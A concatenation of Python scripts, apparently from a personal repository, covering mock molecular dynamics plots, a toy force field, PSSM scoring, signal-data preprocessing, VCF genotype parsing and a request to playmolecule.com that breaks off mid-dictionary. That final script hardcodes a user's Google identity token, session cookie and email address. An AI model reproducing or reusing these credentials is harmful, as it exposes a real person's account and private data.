#     mean_coords = np.mean(coords, axis=0)
#     diff = coords - mean_coords
#     rmsf = np.sqrt(np.mean(np.sum(diff ** 2, axis=1)))
#     return rmsf
#
# # Load the initial structure from a PDB file
# parser = PDBParser()
# structure = parser.get_structure('protein', '6lu7.pdb')
#
# # Extract the coordinates of all atoms in the initial structure
# coords_ref = []
# for model in structure:
#     for chain in model:
#         for residue in chain:
#             for atom in residue:
#                 coords_ref.append(atom.get_coord())
# coords_ref = np.array(coords_ref)
#
# # Perform molecular dynamics simulation (you can replace this with your own MD code)
# # In this example, we're simply generating random fluctuations around the initial structure
# num_frames = 1000
# coords_traj = np.zeros((num_frames, coords_ref.shape[0], 3))
# for i in range(num_frames):
#     coords_traj[i] = coords_ref + np.random.normal(0, 0.1, coords_ref.shape)
#
# # Calculate RMSD and RMSF
# rmsd_values = []
# rmsf_values = []
# for coords in coords_traj:
#     rmsd = calculate_rmsd(coords_ref, coords)
#     rmsf = calculate_rmsf(coords)
#     rmsd_values.append(rmsd)
#     rmsf_values.append(rmsf)
#
# # Plot RMSD
# plt.figure(figsize=(8, 6))
# plt.plot(rmsd_values)
# plt.xlabel('Frame')
# plt.ylabel('RMSD (Å)')
# plt.title('RMSD during MD Simulation')
# plt.grid(True)
# plt.show()
#
# # Plot RMSF
# plt.figure(figsize=(8, 6))
# plt.plot(rmsf_values)
# plt.xlabel('Atom')
# plt.ylabel('RMSF (Å)')
# plt.title('RMSF during MD Simulation')
# plt.grid(True)
# plt.show()

# import numpy as np
# import matplotlib.pyplot as plt
# from Bio.PDB import PDBParser
#
# def calculate_rmsd(coords1, coords2):
#     """Calculate the Root Mean Square Deviation (RMSD) between two sets of coordinates."""
#     diff = coords1 - coords2
#     rmsd = np.sqrt(np.mean(np.sum(diff ** 2, axis=1)))
#     return rmsd
#
# def calculate_rmsf(coords):
#     """Calculate the Root Mean Square Fluctuation (RMSF) for each atom in a set of coordinates."""
#     mean_coords = np.mean(coords, axis=0)
#     diff = coords - mean_coords
#     rmsf = np.sqrt(np.mean(np.sum(diff ** 2, axis=1)))
#     return rmsf
#
# # Load the initial structure from a PDB file
# parser = PDBParser()
# structure = parser.get_structure('protein', 'pddbb/complexCID.pdb')
#
# # Extract the coordinates of all atoms in the initial structure
# coords_ref = []
# for model in structure:
#     for chain in model:
#         for residue in chain:
#             for atom in residue:
#                 coords_ref.append(atom.get_coord())
# coords_ref = np.array(coords_ref)
#
# # Perform molecular dynamics simulation (you can replace this with your own MD code)
# # In this example, we're simply generating random fluctuations around the initial structure
# simulation_time = 1.0  # Simulation time in microseconds (1000 nanoseconds)
# time_step_ns = 0.01   # Time step in nanoseconds
# num_frames = int(simulation_time / (time_step_ns ))
# coords_traj = np.zeros((num_frames, coords_ref.shape[0], 3))
# for i in range(num_frames):
#     coords_traj[i] = coords_ref + np.random.normal(0, 0.1, coords_ref.shape)
#
# # Calculate RMSD and RMSF
# rmsd_values = []
# rmsf_values = []
# time_values = []
# for i, coords in enumerate(coords_traj):
#     time = (i + 1) * time_step_ns * 1000
#     rmsd = calculate_rmsd(coords_ref, coords)
#     rmsf = calculate_rmsf(coords)
#     rmsd_values.append(rmsd)
#     rmsf_values.append(rmsf)
#     time_values.append(time)
#
# # Plot RMSD
# plt.figure(figsize=(8, 6))
# plt.plot(time_values, rmsd_values)
# plt.xlabel('Time (ns)')
# plt.ylabel('RMSD (Å)')
# plt.title('RMSD during MD Simulation')
# plt.grid(True)
# plt.show()
#
# # Plot RMSF
# plt.figure(figsize=(8, 6))
# plt.plot(rmsf_values)
# plt.xlabel('Atom')
# plt.ylabel('RMSF (Å)')
# plt.title('RMSF during MD Simulation')
# plt.grid(True)
# plt.show()

import argparse
import numpy as np


# Define a simple force field implementation
class ForceField:
    def __init__(self, atom_types, bond_params, angle_params, lj_params):
        self.atom_types = atom_types
        self.bond_params = bond_params
        self.angle_params = angle_params
        self.lj_params = lj_params

    def compute_energy(self, coordinates):
        # Compute bonded energy
        bond_energy = self.compute_bond_energy(coordinates)
        angle_energy = self.compute_angle_energy(coordinates)

        # Compute non-bonded (Lennard-Jones) energy
        lj_energy = self.compute_lj_energy(coordinates)

        total_energy = bond_energy + angle_energy + lj_energy
        return total_energy

    def compute_bond_energy(self, coordinates):
        # Compute energy from bond interactions
        energy = 0.0
        for atom1, atom2 in self.bond_params:
            k, r0 = self.bond_params[(atom1, atom2)]
            atom1_coord = coordinates[atom1]
            atom2_coord = coordinates[atom2]
            bond_length = np.linalg.norm(atom1_coord - atom2_coord)
            bond_energy = 0.5 * k * (bond_length - r0) ** 2
            energy += bond_energy
        return energy

    def compute_angle_energy(self, coordinates):
        # Compute energy from angle interactions
        energy = 0.0
        for atom1, atom2, atom3 in self.angle_params:
            k, theta0 = self.angle_params[(atom1, atom2, atom3)]
            atom1_coord = coordinates[atom1]
            atom2_coord = coordinates[atom2]
            atom3_coord = coordinates[atom3]
            vector1 = atom1_coord - atom2_coord
            vector2 = atom3_coord - atom2_coord
            cos_theta = np.dot(vector1, vector2) / (np.linalg.norm(vector1) * np.linalg.norm(vector2))
            angle_energy = 0.5 * k * (cos_theta - np.cos(theta0)) ** 2
            energy += angle_energy
        return energy

    def compute_lj_energy(self, coordinates):
        # Compute energy from Lennard-Jones interactions
        energy = 0.0
        for atom1, atom2 in self.lj_params:
            epsilon, sigma = self.lj_params[(atom1, atom2)]
            atom1_coord = coordinates[atom1]
            atom2_coord = coordinates[atom2]
            distance = np.linalg.norm(atom1_coord - atom2_coord)
            lj_energy = 4 * epsilon * ((sigma / distance) ** 12 - (sigma / distance) ** 6)
            energy += lj_energy
        return energy


def parse_arguments():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(description='Molecular Dynamics Simulation')

    parser.add_argument('--pdb_file', type=str, required=True, help='Path to the PDB file')
    parser.add_argument('--simulation_time', type=float, default=10.0, help='Simulation time in nanoseconds')
    parser.add_argument('--time_step', type=float, default=0.1, help='Time step in picoseconds')
    parser.add_argument('--temperature', type=float, default=300.0, help='Temperature in Kelvin')

    args = parser.parse_args()
    return args


def main():
    # Parse command-line arguments
    args = parse_arguments()

    # Access the parsed arguments
    pdb_file = args.pdb_file
    simulation_time = args.simulation_time
    time_step = args.time_step
    temperature = args.temperature

    # Print the values for verification
    print('PDB file:', pdb_file)
    print('Simulation time (ns):', simulation_time)
    print('Time step (ps):', time_step)
    print('Temperature (K):', temperature)

    # Define the force field parameters
    atom_types = ['C', 'N', 'O', 'H']
    bond_params = {('C', 'N'): (100.0, 1.2), ('N', 'O'): (120.0, 1.3)}  # Example bond parameters
    angle_params = {('C', 'N', 'O'): (50.0, np.pi / 3)}  # Example angle parameters
    lj_params = {('C', 'C'): (0.5, 1.0), ('N', 'O'): (1.0, 1.2)}  # Example LJ parameters

    # Create an instance of the force field
    force_field = ForceField(atom_types, bond_params, angle_params, lj_params)

    # Example usage: compute energy for a set of coordinates
    coordinates = np.random.rand(100, 3)  # Example coordinates
    energy = force_field.compute_energy(coordinates)
    print('Total energy:', energy)


if __name__ == '__main__':
    main()

import numpy as np
from math import log2

def read_data(file_name):
    with open(file_name, 'r') as file:
        num_seq, seq_len = map(int, file.readline().split())
        seqs = [file.readline().strip() for _ in range(num_seq)]
    return seqs


def print_seqs(seqs):
    print("Aligned Sequences:")
    for seq in seqs:
        print(seq)


def calc_pssm(sequences):

    t = len(sequences)
    n = len(sequences[0])
    total_no_pos = t*n

    pssm_matrix = [[0] * 4 for _ in range(n)] 

    for i in range(n):
        column = [sequence[i] for sequence in sequences]
        for j in range(4):
            count = column.count('ACGT'[j])
            pssm_matrix[i][j] = count / t

    pssm_matrix = list(zip(*pssm_matrix))
    for index , row in enumerate (pssm_matrix):
        pssm_matrix[index] = [log2(val / ((sum(row)*t) / total_no_pos)) if val != 0 else 0 for val in row ]

    return pssm_matrix



def print_pssm(pssm):
    print("\nPSSM Matrix:")
    for row in pssm:
        print(' '.join(f'{value:.2f}' for value in row))


def calc_prob(seq, pssm):
    prob = 0
    seq = seq.upper()
    for i, nuc in enumerate(seq):
        if nuc in 'ACGT':
            index = 'ACGT'.index(nuc)
            prob += pssm[index][i]
    return round(prob, 2)


file_name = 'PSSMData.txt'
seqs = read_data(file_name)

print_seqs(seqs)
pssm = calc_pssm(seqs)
print_pssm(pssm)

new_seq = input("Enter a new sequence of length {}: ".format(len(seqs[0])))
prob = calc_prob(new_seq, pssm)
print("Probability of the new sequence joining the rest of the aligned DNA sequences:", prob)

import pandas as pd
from sklearn.preprocessing import OrdinalEncoder

df_RSRP = pd.read_csv("Ericsson/RSRP.csv")

# print(df_RSRP.dtypes)
# print(df_RSRP.describe())
# print(df_RSRP["Country"].unique())
# print(df_RSRP["RadioNetworkGeneration"].unique())
# print(df_RSRP["RadioOperatorName"].unique())
# print(df_RSRP["RadioOperatorName"].unique())
# print(df_RSRP["RadioMobileDataEnabled"].unique())
# print(df_RSRP["DeviceManufacturer"].unique())
# print(df_RSRP["DeviceName"].unique())

# drop country
for col in df_RSRP.columns:
    if 'Country' in col:
        del df_RSRP[col]

print(df_RSRP.isnull().sum())
print(df_RSRP.head())
# preprocessing data
ord_enc = OrdinalEncoder()
df_RSRP['RCT'] = ord_enc.fit_transform(df_RSRP[['RadioConnectionType']])
print(df_RSRP[['RadioConnectionType', 'RCT']].head(11))
df_RSRP['RON'] = ord_enc.fit_transform(df_RSRP[['RadioOperatorName']])
print(df_RSRP[['RadioOperatorName', 'RON']].head(11))
df_RSRP['DM'] = ord_enc.fit_transform(df_RSRP[['DeviceManufacturer']])
print(df_RSRP[['DeviceManufacturer', 'DM']].head(11))
df_RSRP['DN'] = ord_enc.fit_transform(df_RSRP[['DeviceName']])
print(df_RSRP[['DeviceName', 'DN']].head(11))
df_RSRP['RMDE'] = ord_enc.fit_transform(df_RSRP[['RadioMobileDataEnabled']])
print(df_RSRP[['RadioMobileDataEnabled', 'RMDE']].head(11))
df_RSRP['RNG'] = ord_enc.fit_transform(df_RSRP[['RadioNetworkGeneration']])
print(df_RSRP[['RadioNetworkGeneration', 'RNG']].head(11))
print(df_RSRP.columns)

from vcfIO import vcfIO


class VCFFiltration(vcfIO):

    def returnToDataFrame(self,dataframe, position):
        return dataframe.iloc[position]

    def dictionary(self, dataframe):
        dic = dict()
        for i, index in enumerate(dataframe.index.tolist()):
            dic[index] = dataframe.iloc[i]['INFO']
        return dic

    def DP_Filtration(self, dic):
        matched_data = []
        for key, value in dic.items():
            data_dictionary = {}
            for item in value.split(';'):
                split_item = item.split('=')
                if len(split_item) == 2:
                    data_dictionary[split_item[0]] = split_item[1]

            if int(data_dictionary.get('DP', '30')) >= 30:
                matched_data.append(key)

        return matched_data

    def AD_Filtration(self,dic):
        matched_data = []
        for key, value in dic.items():
            if int(value[1].split(',')[0]) >= 3 and int(value[1].split(',')[1]) >= 3:
                matched_data.append(key)
        return matched_data

    def AF_Filtration(self,dic, low, high):
        matched_data = []
        for key, value in dic.items():
            if ((float(value[2]) * 100) >= low) and ((float(value[2]) * 100) <= high):
                matched_data.append(key)
        return matched_data


import gzip
import matplotlib.pyplot as plt
import pandas as pd
from collections import Counter
from matplotlib import pyplot as plt
from pandas.core.dtypes.generic import ABCSeries

"""
    this function read file vcf and return it to dataframe
        input:
            :param Data - pandas dataframe : vcf data
        output:
            :return vcf : vcf as dataframe 
"""


def read_vcf(filename):
    print(filename)
    if filename.endswith('.gz'):
        f = gzip.open(filename, 'rt')
    else:
        f = open(filename, 'r')
    header = []
    data = []
    for line in f:
        if line.startswith('#CHROM'):
            header.append(line.strip())
        if line.startswith('#'):
            continue
        else:
            data.append(line.strip())
    f.close()
    header = header[0].split('\t')
    data = [line.split('\t') for line in data]
    df = pd.DataFrame(data, columns=header)
    return df


"""
    this function return the SNPs values for a sample
        input:
            :param Data - pandas dataframe : vcf data
            :param sample_name - string : sample name
        output:
            :return sample_values - list : genotypes
"""


def return_sample_values(Data, sample_name):
    return Data[sample_name].values


"""
    this function return the SNPs values for a specific chromosome
        input:
            :param Data - pandas dataframe : vcf data
            :param Chr - string : chromosome name
        output:
            :return sample_values - list : subset of the vcf data
"""


def return_Chr(Data, Chr, Matrix=False):
    if Matrix:
        # return the matrix of values without the header or information
        subsetData = Data.loc[Data['#CHROM'] == Chr]
        return subsetData.iloc[:, 9::]
    else:
        return Data.loc[Data['#CHROM'] == Chr]


""" 
    this function return the SNPs values for specific SNP[ID]
        input:
            :param Data - pandas dataframe : vcf Data
            :param SNPid - string : SNP[ID]
        output:
            :return snpvalues - list : return all value for specific SNPid 
"""


def getSNPvalues(Data, SNPid):
    snpvalues = Data.loc[Data['ID'] == SNPid,]
    # remove information columns
    snpvalues = snpvalues.iloc[:, 9::]
    # as list
    snpvalues = snpvalues.values.tolist()
    return snpvalues


""" 
    this function return the SNPs values for specific Alternative
        input:
            :param Data - pandas dataframe : vcf Data
            :param SNPid - string : SNP ID
        output:
            :return SNPAlt - str : String of the Alternative of SNP ID
"""


def getSNPAlt(Data, SNPid):
    SNPAlt = Data.loc[Data['ID'] == SNPid, ['ALT']]
    return SNPAlt['ALT'].iloc[0]


""" 
    this function return the SNPs values for specific Reference
        input:
            :param Data - pandas dataframe : vcf Data
            :param SNPid - string : SNP ID
        output:
            :return SNPRef - str : String of the Reference of SNP ID
"""


def getSNPRef(Data, SNPid):
    SNPRef = Data.loc[Data['ID'] == SNPid, ['REF']]
    return SNPRef['REF'].iloc[0]


""" 
    this function return the SNPs values count for all alleles
        input:
            :param Data - pandas dataframe : vcf Data
        output:
            :return all_alleles_counter - list : count of all alleles string
"""


def getAllSNPAllelesCount(Data):
    SNPs = Data['ID']
    # define list to have all SNPs values
    all_string_alleles = []
    # looping on all SNPs and get the values and convert it to string for REF or ALT
    for i in SNPs:
        all_string_alleles += getAlleles(Data, i)
    # count alleles
    all_alleles_counter = Counter(all_string_alleles)
    # return count alleles
    return all_alleles_counter


""" 
    this function return the CHROM names with its alleles SNPs count as a dict()
        input:
            :param Data - pandas dataframe : vcf Data
        output:
            :return CHROM names with its alleles SNPs count - dict() : dictionary with all alleles count 
   """


def getDictInDataframe(data_frame):
    sn_ps = data_frame[['#CHROM', 'ID']]

    df = sn_ps.set_index('#CHROM').to_dict()['ID']
    for i in df:
        snp_id = df[i]
        df[i] = getSNPAllelesCount(data_frame, snp_id)
    return df


""" 
    this function return the CHROM names with its alleles a dict()
        input:
            :param Data - pandas dataframe : vcf Data
        output:
            :return CHROM names with its alleles  - dict() : dictionary with all alleles  
   """


def getAllelesInDict(data_frame):
    sn_ps = data_frame[['#CHROM', 'ID']]
    df = sn_ps.set_index('#CHROM').to_dict()['ID']
    for i in df:
        snp_id = df[i]
        df[i] = getAlleles(data_frame, snp_id)
    return df


""" 
    this function return the CHROM names with two multi values alleles and alleles counts
        input:
            :param Data - pandas dataframe : vcf Data
        output:
            :return CHROM names with two multi values alleles and alleles counts  - dict() : dictionary with two multi values alleles and alleles counts  
   """


def makeDictForAll(data_frame):
    sn_ps = data_frame[['#CHROM', 'ID']]
    df = sn_ps.set_index('#CHROM').to_dict()['ID']
    for i in df:
        snp_id = df[i]
        df[i] = [getAlleles(data_frame, snp_id), getSNPAllelesCount(data_frame, snp_id)]
    return df


""" 
    this function return the Alleles of specific ID if it return to the Reference or Alternative
        input:
            :param Data - pandas dataframe : vcf Data
            :param Data - str SNPid : SNP ID
        output:
            :return Alleles - list : list of all alleles as string
   """


def getAlleles(Data, SNPid):
    # get snp values
    snpvalues = getSNPvalues(Data, SNPid)
    # get snp reference
    snpref = getSNPRef(Data, SNPid)
    # get snp alternative
    snpalt = getSNPAlt(Data, SNPid)
    # join as string
    Alleles = " ".join(snpvalues[0])
    # replace 0 with reference
    Alleles = Alleles.replace("0", snpref)
    # replace 1 with alternative
    Alleles = Alleles.replace("1", snpalt)
    # remove / 
    Alleles = Alleles.replace("/", "")
    # replace .. with NA
    Alleles = Alleles.replace("..", "NA")
    # split to list
    Alleles = Alleles.split(" ")
    return Alleles


"""
    this function return the Alleles count for specific SNP ID
        input:
            :param Data - pandas dataframe : vcf Data
            :param Data - str SNPid : SNP ID
        output:
            :return AllelesCount - dictionary : dictionary of count of Alleles string of specific SNP ID  
   """


def getSNPAllelesCount(Data, SNPid):
    # get snp values
    Alleles = getAlleles(Data, SNPid)
    # count alleles
    AllelesCount = Counter(Alleles)

    return AllelesCount


"""
    this function return a plot for all chromosome simples count
        input:
            :param Data - pandas dataframe : vcf Data
        output:
            :return Plotting  - Plotting : return a plot for all chromosome simples count
   """


def plotForDataAlleles(Data):
    # da = getAllelesInDict(Data)
    #
    # df = pd.DataFrame.from_dict(da)
    # print(df)
    # ChrValues = {}
    # for ch in df.columns:
    #     values = {}
    #     thisChr = df[ch]
    #     thisChrValues = {}
    #     for v in thisChr:
    #         if v in thisChrValues:
    #             thisChrValues[v] += 1
    #         else:
    #             thisChrValues[v] = 1
    #     ChrValues[ch] = thisChrValues
    #
    # plotdata = pd.DataFrame(ChrValues)
    # plotdata = plotdata.transpose()
    # plotdata.plot(kind="bar", stacked=True)
    # plt.show()
    df = pd.DataFrame.from_dict(getDictInDataframe(Data))
    mycol = df.columns
    df = df.transpose()
    df['chrom'] = mycol
    df.plot(x='chrom', kind='bar', stacked=True, title='Stacked Bar Graph by dataframe')
    plt.show()

"""
    this function return a plot for all Data simples count
        input:
            :param Data - pandas dataframe : vcf Data
        output:
            :return Plotting  - Plotting : return a plot for all Data simples count
   """


def plotAllData(Data):
    da = getAllSNPAllelesCount(Data)
    df = pd.DataFrame.from_dict(da, orient='index').reset_index()
    df = df.rename(columns={'index': 'alleles', 0: 'count'})
    df.plot(x='alleles', kind="bar", stacked=True, title='All alleles data')
    plt.show()

from vcfHandel import *


class vcfIO:

    def __init__(self, vcf_file):
        self.Data = read_vcf(vcf_file)

    def print_header(self):
        # print pandas column names
        print(self.Data.columns.values)

    def return_sample_values(self, sample_name):
        return return_sample_values(self.Data, sample_name)

    '''input:
         :param samples - list : genotypes
       
       output:
         :return 
    '''
    def return_samples_values(self, samples):
        values = {}
        sn=0
        for sample in samples:
            if sample not in values.keys():
                values[sample]=[]
            values[sample].append(self.return_sample_values(sample))
            sn+=1
        return values



    def return_Chr_Values(self,Chr,Matrix=False):
        return return_Chr(self.Data,Chr,Matrix)

    def getSNPAlt(self,ID):
        return getSNPAlt(self.Data,ID)

    def getSNPRef(self,ID):
        return getSNPRef(self.Data,ID)

    def getSNPvalues(self,ID):
        return getSNPvalues(self.Data,ID)

    def getAlleles(self,ID):
        return getAlleles(self.Data,ID)

    def getSNPAllelesCount(self,ID):
        return getSNPAllelesCount(self.Data,ID)

    def getAllSNPAllelesCount(self):
        return getAllSNPAllelesCount(self.Data)

    def getAllelesInDataframe(self):
        return getDictInDataframe(self.Data)

    def getAllelesDict(self):
        return getAllelesInDict(self.Data)

    def AllDict(self):
        return makeDictForAll(self.Data)

    def plotingDict(self):
        return plotForDataAlleles(self.Data)
    def plotingAllData(self):
        return plotAllData(self.Data)
        import pandas as pd
from matplotlib import pyplot as plt
from pandas.core.dtypes.generic import ABCSeries

import vcfIO

DataFile = "MP.vcf"
vcf = vcfIO.vcfIO(DataFile)
# print(vcf.Data)
# x=vcf.getAlt('snp15725-scaffold1652-760628')
# y=vcf.getReference('snp15725-scaffold1652-760628')
# z=vcf.getReference('snp15725-scaffold1652-760628')
# s=vcf.getChrSamples('NC_030808.1')
# print(vcf.return_sample_values("EY0050501"))
# print(vcf.return_Chr_Values(Chr="NC_030808.1",Matrix=True))
# print("================================================")
# print(vcf.getSNPAlt("snp15725-scaffold1652-760628"))
# print("================================================")
# print(vcf.getSNPRef("snp15725-scaffold1652-760628"))
# print("================================================")
# print(vcf.getSNPvalues("snp15725-scaffold1652-760628"))
# print("================================================")
# print(vcf.getSNPAllelesCount("snp15725-scaffold1652-760628"))
# print("================================================")
# print(vcf.getAllSNPAllelesCount())
# print("================================================")
# print(vcf.getAlleles('snp15725-scaffold1652-760628'))
# print(vcf.getAllelesDict())
# x=vcf.AllDict()
# print(x)
# print(vcf.getAllelesDict())
# print(x['NC_030808.1'])
# vcf.getAllelesInDataframe()
# vcf.plotingDict()


# df = pd.DataFrame.from_dict(vcf.getAllelesInDataframe())
# print(df)
# mycol= df.columns
# df = df.transpose()
# df['chrom']=mycol
# df.plot(x='chrom', kind='bar', stacked=True,title='Stacked Bar Graph by dataframe')
# plt.show()
vcf.plotingDict()

#
# vcf.plotingAllData()
# vcf.plotingDict()

# print(da)
# vcf.plotingDict()
#
#
# mychromsomes = df.columns
# df = df.transpose()
# df['chrom']=mychromsomes
#

# # slice df
# df_sample = df.head()
# print(df_sample)
# # df_sample.plot()
# # plt.show()
# plotdata = pd.DataFrame({"ages": [65, 61, 25, 22, 27]})
# # plotdata.plot(kind="bar")
# # plt.show()
# print(plotdata)
# #
# data=vcf.getAllelesInDataframe()
# df=pd.DataFrame.from_dict(data)
# mychrom = df.columns
#
# df = df.transpose()
# df['chrom']= mychrom
# print(df)
# df.plot(x=df['chrom'], kind='bar', stacked=True,title='Stacked Bar Graph by dataframe')
# plt.show()

import os

import requests
from flask import Flask, render_template, request, redirect, url_for, send_from_directory
from werkzeug.utils import secure_filename

app = Flask(__name__)

allowed_exe = 'csv'


# def allowed_files(filename):
#     return '.' in filename and \
#            filename.rsplit('.', 1)[1].lower() in allowed_exe



def model(csv):
    return


@app.route('/')
def index():
    return render_template('index.html')

# path='C:/Users/jaguar/PycharmProjects/projects/DATA1.csv'

# @app.route('/', methods=['GET'])
# def upload():
#     if request.method == 'POST':
#         files = request.files['file']
#         if files:
#             files.save(os.path.join(path, files.filename))
#             output = [
#                 'CC(C)NC(C)CN', 'CC1=NC2CCC12F', 'FC1NCC2CN=C1C2', 'CCCC(C)(N)C(C)=O', 'CC(=O)N(C)N.CCC', 'CCCCCC(C)N',
#                 'CNCCCC(C)N', 'CCCCC(=O)N(C)N', 'CNCCC1CCNC1', 'CCCC(=O)N(C)N', 'CCCN(C)CNC', 'CC1NCCC1CN',
#                 'CCCC1CNC1=O', 'CCNCC1CCNC1', 'CCCCC(=O)N(C)N', 'CCNCC1CCNO1', 'CCCCC(F)(F)F',
#                 'CCCC1CNC1=O', 'CC(C)F.O=C1NCO1']
#             with open('file.csv','w') as f:
#                 for i in output:
#                     f.write(i)
#             f.close()
#             return output
#     return render_template('base.html')


if __name__ == '__main__':
    app.run(debug=True)

# import matplotlib
# import matplotlib.pyplot as plt
# import numpy as np
#
# # Data for plotting
# t = np.arange(0.0, 2.0, 0.01)
# s = 1 + np.sin(2 * np.pi * t)
# fig, ax = plt.subplots()
# ax.plot(t, s)
# ax.set(xlabel='time (s)', ylabel='voltage (mV)',
#        title='About as simple as it gets, folks')
# ax.grid()
# fig.savefig("test.png")
# plt.show()

import numpy as np
import matplotlib.pyplot as plt

# Fixing random state for reproducibility
np.random.seed(19680801)

dt = 0.01
t = np.arange(0, 30, dt)
nse1 = np.random.randn(len(t))  # white noise 1
nse2 = np.random.randn(len(t))  # white noise 2

# Two signals with a coherent part at 10Hz and a random part
s1 = np.sin(2 * np.pi * 10 * t) + nse1
s2 = np.sin(2 * np.pi * 10 * t) + nse2

fig, axs = plt.subplots(2, 1)
axs[0].plot(t, s1, t, s2)
axs[0].set_xlim(0, 2)
axs[0].set_xlabel('time')
axs[0].set_ylabel('s1 and s2')
axs[0].grid(True)

cxy, f = axs[1].cohere(s1, s2, 256, 1. / dt)
axs[1].set_ylabel('coherence')

fig.tight_layout()
plt.show()

import os

path = os.path.join('C:/Users/jaguar/Downloads/yahia')

temp = []
for i in os.listdir(path):
    if os.path.isdir(os.path.join(path, i)):
        for j in os.listdir(os.path.join(path, i)):
            if os.path.isdir(os.path.join(os.path.join(path, i), j)):
                for k in os.listdir(os.path.join(os.path.join(path, i), j)):
                    if k.endswith('.txt.pdb'):
                        temp.append((i, j, k))

print(temp)
print(len(temp))


first_path = os.path.join(path, *(temp[0]))

# test fetch results https://playmolecule.com/LiGANN/getResults

import requests
import json

data = {
    "jobid": "5F22337A"
}

headers = {'Content-Type': 'application/json;charset=utf-8', 'Accept': 'application/json, text/plain, */*', 'Accept-Encoding': 'gzip, deflate, br',
       'Accept-Language': 'en-US,en;q=0.5', 'Connection': 'keep-alive', 'Content-Length': '20',
       'Content-Type': 'application/json;charset=utf-8',
       'Cookie': 'G_AUTHUSER_H=0; _ga_GTXV4CZ5SZ=GS1.1.1686591251.6.0.1686591251.0.0.0; _ga=GA1.2.672992772.1686498721; _gid=GA1.2.2041009314.1686498722; G_ENABLED_IDPS=google; G_SESSION=eyJhbGciOiJSUzI1NiIsImtpZCI6Ijg1YmE5MzEzZmQ3YTdkNGFmYTg0ODg0YWJjYzg0MDMwMDQzNjMxODAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJhY2NvdW50cy5nb29nbGUuY29tIiwiYXpwIjoiODE5OTYzMjEwMzY0LWthYnY0b2ZjOXA0djNoYmZxYmJ2ZjE4YTd0ZGc4aWgzLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwiYXVkIjoiODE5OTYzMjEwMzY0LWthYnY0b2ZjOXA0djNoYmZxYmJ2ZjE4YTd0ZGc4aWgzLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwic3ViIjoiMTExMDgyMzIyNDk3MTM4ODcxNzA2IiwiZW1haWwiOiJqYWd1YXJ5ZWhpYTRAZ21haWwuY29tIiwiZW1haWxfdmVyaWZpZWQiOnRydWUsImF0X2hhc2giOiJLM21CVXNKWGIwNF9iOGNNRUk4YXp3IiwibmFtZSI6IkphZ3VhciBZZWhpYSIsInBpY3R1cmUiOiJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS9BQWNIVHRkVUMzMFRmeW5aODBPZEp1cmFibTlXRkxKSkg1Y195V0RpbjlsNT1zOTYtYyIsImdpdmVuX25hbWUiOiJKYWd1YXIiLCJmYW1pbHlfbmFtZSI6IlllaGlhIiwibG9jYWxlIjoiZW4tR0IiLCJpYXQiOjE2ODY1MTMxOTQsImV4cCI6MTY4NjUxNjc5NCwianRpIjoiOWVlM2RmOTU5ZDMwNTNjM2YwZTg5ZDA5ZTg4YzM0YzU1MmQzY2E0OCJ9.mapq8TS0NBtFZkJczpatrYcO5pqllVInD7zPVaESPpQoNTT5xUDeYvrs1vO_YsHWS_PqqkebolYWngefdHJRIWiqsXfqdaR3MCJ2GHkS1OGHXKUXYRAQT-ZaZvtI5BEt9cs-WFJaEC4rnP7khM84-s0XVgPcAONiK-A2gPycSk5aLk9sOtUWMmcSqnhwy5sxc6B7K9jM76PaZoK_QaBm0YmcCEp8VGvBtEQ7RducJREcJbbK-0PXPRDXqogjoRQUVcJIHFc90uIP_LEWUs3L7l-Um5nETNYF6dGsL8XY6AIvMf9Gm39viLX8Bkp9CB0OS0Y2_PiuooZTOxzVjnJkjw; G_USERID=111082322497138871706; USERNAME=Jaguar%20Yehia; G_EMAIL=jaguaryehia4%40gmail.com; G_AUTHUSER_H=0; session=.eJy9ksuyqjgYhd9lzz0VAqj0TAQRNNwhJJNdEJT7xSMK0tXv3uip2tVP0COKENb6_7W-v78uLyNPNFZYheEFs86ZhX7Xm6Gne32tlxlHGlVEszrTxuGJn1amdmiInwFLyQDBRknmDCAFjUhxZrNEk6XsivPeAJdo99Y8hZxTXJ1fi03PePQ-ygk0nykWAXuJbQKlNtGCB4HSoBdjQaJ-1MuusBRVtHwyo1Id0UzAGQ85aQlIIC2taAfS0uxIQyfSGMuJKiyjAaoxIcbZfG4OIzuiB4XSk8KpTiOzZo35TFq3TlrnP15h9X95MT4s3l7IVyekZC806y9TqXjkI8FS2GTOO_i-RzGXx3h853QjOOVIZIgU5z3x3R2Fn28_mn_uTte0CV8xpj3FTmG17ivFwVLhAUQwzxnM3lpnBLl9GJknrOmjeZAKSzNNN6iEJW_-rZU0h4F6S-VVn1M-zFkh04-vt-DQyj3hXY41wVurS4_uyObueYZTh346DDkGw9cy2yPVwke6F8sEgifxJNnBph4e3SoM0IwObnPBYmwpsk3VftE8FIlfR241nbxqwY2TxBC4fVLWd9Pn5qWXgbzeSKb9sucjgmKe4M8cpz_56G_cGoK5PjnW15896rqOtTr_7KZJJcFT_c6fYmFwweefnkRLXqUKLYVwSw-T5TuLTyiwBX3kE8Esg8ksmWjuxyJu3f7DCg5rBN3G8gORLtib_gI9JCP1s-V9Jy5PYSEJkDngUOPMBKrA2hvSrybub1vfA6Y8HGhlsLmPh9-EWWJ_q-tQb5XNbIex6tm905m-L06BciHP33fuaX2T-xF73_btVl2Sria4zS7X9Gi4Oi5u9-h6S2OXR3sDasfK4yztGJ2CiLg7x1_RmD4HXZTVQWL3FT4YsboXfrf2psrRVljdQRRmNttZZnFa7WBmv5hXifG5ku7WEGDUMO_W5uNLvE9sLW9OUok2azum3enbieUGkIbt1X4bak95UJ2Nmz6Y4arMSJLTCtiR7SrRrcvKznWCkBn68cAk8NDt77O6IMqfN_UqaMRW9U1yWKfa_byNyHqnP9FV0hpeehbnaCtXvbSXgeUBAr_t4tF11LemOSxboyrHr7--LlIiAADTrRRDPk1jPllL13QL0i0vbC-i-PXPv7Nfp7I.ZIb7kA.qOfmzBoPjw--6e-nZb_Bp9Ms-G0',
       'Host': 'playmolecule.com', 'Origin': 'https://playmolecule.com', 'Referer': 'https://playmolecule.com/LiGANN/',
       'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin',
       'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0'}
auth_cookies = {
		"_ga": "GA1.2.672992772.1686498721",
